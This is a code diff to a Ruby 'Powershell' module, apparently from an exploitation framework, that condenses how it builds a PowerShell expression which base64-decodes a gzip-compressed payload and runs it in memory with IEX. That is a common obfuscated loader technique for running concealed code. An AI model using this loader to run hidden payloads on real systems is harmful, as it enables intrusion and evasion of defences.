@@ -54,14 +54,11 @@ module Powershell
 
       # Build the powershell expression
       # Decode base64 encoded command and create a stream object
-      psh_expression =  "$s=New-Object IO.MemoryStream(,"
-      psh_expression << "$([Convert]::FromBase64String('#{encoded_stream}')));"
-      # Uncompress and invoke the expression (execute)
-      psh_expression << "$(IEX $(New-Object IO.StreamReader("
-      psh_expression << "$(New-Object IO.Compression.GzipStream("
-      psh_expression << "$s,"
+      psh_expression =  "IEX(New-Object IO.StreamReader("
+      psh_expression << "(New-Object IO.Compression.GzipStream("
+      psh_expression << "(New-Object IO.MemoryStream(,[Convert]::FromBase64String('#{encoded_stream}'))),"
       psh_expression << "[IO.Compression.CompressionMode]::Decompress)),"
-      psh_expression << "[Text.Encoding]::ASCII)).ReadToEnd());"
+      psh_expression << "[Text.Encoding]::ASCII)).ReadToEnd();"
 
       # If eof is set, add a marker to signify end of code output
       #if (eof && eof.length == 8) then psh_expression += "'#{eof}'" end
